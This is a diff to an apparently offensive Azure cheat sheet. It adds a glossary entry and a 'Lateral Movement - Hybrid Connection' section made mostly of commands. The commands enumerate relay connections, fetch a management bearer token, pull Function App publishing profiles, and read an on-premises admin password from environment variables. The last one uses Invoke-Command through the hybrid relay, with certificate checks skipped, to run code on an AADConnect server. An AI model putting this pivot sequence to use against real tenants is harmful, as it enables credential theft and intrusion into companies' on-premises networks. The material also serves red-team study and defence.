@@ -27,6 +27,9 @@ The Enterprise represents the Azure global unique identity that a company owns a
 #### Function App
 The also called Azure Functions provides the possibility to run code serverless. The code execution reacts to events like processing file uploads or scheduled tasks.
 
+### Hybrid Connection
+Uses Azure Relay to enable bi-directional request-response and binary stream communication between App Services/Function Apps and on-premises services.
+
 #### Managed Identity
 A Managed Identity is a Service Principal of a special type that may only be used with Azure resources. Managed Identities can be used to access Azure Key Vaults and storage accounts.
 
@@ -418,5 +421,44 @@ Supportet locations:
 Azure Repos
 Github
 Bitbucket
+```
+
+## Lateral Movement - Hybrid Connection
+* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
+* https://whiteknightlabs.com/2024/02/21/pivoting-from-microsoft-cloud-to-on-premise-machines
+
+```
+az automation account list
+
+Get-AzResource
+
+Get-AzRelayHybridConnection -Namespace <namespace> -ResourceGroupName <groupName>  
+Get-AzRelayHybridConnection -Namespace <namespace> -ResourceGroupName <groupName> -Name <name> | fl *
+Get-AzAccessToken -RessourceUrl "https://management.azure.com"
+
+$AccessToken = "<token>"
+$URL = "https://management.azure.com/subscriptions/<subcriptionId>/resourceGroups/<resourceGroupName>/providers/Microsoft.Web/sites/<functionAppName>/hybridConnectionRelays?api-version=2018-11-01"
+
+$Params = @{
+    "URI"     = $URL
+    "Method"  = "GET"
+    "Headers" = @{
+        "Authorization" = "Bearer $AccessToken"
+        "Content-Type"  = "application/json"
+        }
+    }
+
+$Result = Invoke-RestMethod @Params -UseBasicParsing
+$Result.value.properties
+
+az functionapp hybrid-connection list --name <functionAppName> --resource-group <resourceGroupName>
+
+Get-AzWebAppPublishingProfile -ResourceGroupName <groupName> -Name <name>
+
+https://<functionAppName>.scm.azurewebsites.net/basicauth
+
+$password = CnvertTo-SecureString $env:onpremadminpassword -AsPlainText -Force
+$credential = [System.Management.Automation.PSCredential]::new($env:onpremadminusername, $password)
+Invoke-Command -ComputerName $env:hybridconnectionhostname -Port 5986 -UseSSL -ScriptBlock {Invoke-Command -ComputerName AADConnect -Credential $Using:credential -ScriptBlock {hostname} } -SessionOption (New-PSSessionOption -SkipCACheck) -ErrorAction Stop -Credential $credential
 ```
 
